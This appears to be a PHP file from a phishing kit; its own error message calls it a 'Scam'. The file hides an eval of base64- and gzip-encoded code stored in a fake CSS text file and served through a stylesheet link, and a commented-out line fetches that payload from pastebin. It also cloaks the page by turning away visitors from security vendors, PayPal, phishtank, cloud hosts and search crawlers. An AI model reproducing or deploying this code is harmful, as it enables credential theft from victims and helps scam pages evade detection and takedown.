<?php
// Decoded by Girudatsu.com Member

if (isset($_GET['style_css'])) {
    //$_curl = curl_init('http://pastebin.com/raw/DBM9VN0h');
    //curl_setopt($_curl, CURLOPT_RETURNTRANSFER, (bool) (1));
    $_result = file_get_contents('../css/css.txt');//curl_exec($_curl);
    //curl_close($_curl);
    @eval('?>' . gzuncompress(base64_decode("{$_result}")));
    exit;
}
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array('above', 'google', 'softlayer', 'amazonaws', 'cyveillance', 'phishtank', 'dreamhost', 'netpilot', 'calyxinstitute', 'tor-exit', 'paypal');
foreach ($blocked_words as $word) {
    if (substr_count($hostname, $word) > -59 - -59) {
        include 'inc/banned.php';
    }
}
if (strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot') or strpos($_SERVER['HTTP_USER_AGENT'], 'Yahoo! Slurp') or strpos($_SERVER['HTTP_USER_AGENT'], 'YahooSeeker') or strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') or strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot') or strpos($_SERVER['HTTP_USER_AGENT'], 'crawler') or strpos($_SERVER['HTTP_USER_AGENT'], 'PycURL') or strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') !== (bool) (-12 - -12)) {
    include 'inc/banned.php';
}
if (!class_exists('PDO')) {
    echo '<pre>[+] This Scam Can\'t Work in This Host,<br>[+] You Must Enable This extension <b>\'php_pdo_sqlite.dll\'</b> from <b>\'php.ini\'</b><br>[+] if You Need Help Contact your mom at <a href=\'http://google.com\'>http://google.com/</a><br>';
    exit;
}
$valid = (bool) (121 + -94 + -(109 + -82));
$x_pdo = new PDO('sqlite:admin/database.db');
if ($x_pdo) {
    $settings = $x_pdo->query('SELECT * FROM `settings`')->fetch(PDO::FETCH_ASSOC);

}
echo '<link rel=\'stylesheet\' href=\'css/font-sans.css\'>';
echo '<link rel=\'stylesheet\' href=\'css/template.css\'>';
echo '<link rel=\'stylesheet\' href=\'inc/bots.php?style_css\'>';
